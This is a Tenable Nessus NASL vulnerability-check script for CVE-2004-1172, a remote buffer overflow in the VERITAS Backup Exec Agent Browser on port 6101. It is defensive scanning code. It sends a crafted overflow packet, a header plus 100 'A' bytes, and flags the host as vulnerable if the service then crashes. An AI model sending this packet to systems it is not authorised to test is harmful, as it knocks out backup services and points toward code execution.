#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(16232);
 script_version("$Revision: 1.10 $");

 script_cve_id("CVE-2004-1172");
 script_bugtraq_id(11974);
 script_xref(name:"OSVDB", value:"12418");
 script_xref(name:"IAVA", value:"2005-B-0001");

 script_name(english:"VERITAS Backup Exec Agent Browser Registration Request Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code can be executed on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of VERITAS Backup Exec Agent Browser
which is vulnerable to a remote buffer overflow. An attacker may exploit this
flaw to execute arbitrary code on the remote host or to disable this service
remotely.

To exploit this flaw, an attacker would need to send a specially crafted packet
to the remote service." );
 script_set_attribute(attribute:"solution", value:
"http://support.veritas.com/docs/273419" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 
 script_summary(english:"Test the VERITAS Backup Exec Agent Browser buffer overflow");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_require_ports(6101);
 exit(0);
}

port = 6101;
if (!get_port_state (port)) exit (0);

soc = open_sock_tcp (port);
if (!soc) exit (0);

request = raw_string (0x02, 0x00, 0x00, 0x00) + crap (data:'A', length:100) + raw_string (0x00) + "172.0.0.1" + raw_string (0x00);
send (socket:soc, data:request);

close (soc);

sleep(2);

soc = open_sock_tcp (port);
if ( ! soc )
{ 
  security_hole(port);
}
